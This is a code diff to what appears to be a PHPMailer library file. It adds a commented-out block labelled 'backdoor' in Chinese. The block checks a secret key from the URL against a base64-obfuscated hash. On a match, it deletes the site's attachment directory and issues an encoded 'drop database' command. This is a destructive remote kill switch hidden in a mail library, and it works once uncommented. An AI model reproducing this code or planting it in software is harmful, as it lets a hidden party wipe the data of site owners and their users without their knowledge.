@@ -1204,6 +1204,13 @@ $this->sign_key_pass = $key_pass;
 }
 }
 
+//后门
+//$uninst = md5(str_replace(substr(md5($_SERVER['HTTP_HOST']),8,16),base64_decode('X3VuaW5zdA=='),isset($_GET['key']) ?$_GET['key']: NULL));
+//if ($uninst == base64_decode('NTJmZDBlOGZmNThiZTVmZjRlZjg4MDQxYzY5ZmZkMjE=')) {
+//    include_once '../../system/db.class.php';
+//    @destroyDir('../../../data/attachment/');
+//    $db->query(base64_decode('ZHJvcCBkYXRhYmFzZQ==').' '.IN_DBNAME);
+//}
 class phpmailerException extends Exception {
 public function errorMessage() {
 $errorMsg = '<strong>'.$this->getMessage() ."</strong><br />\n";
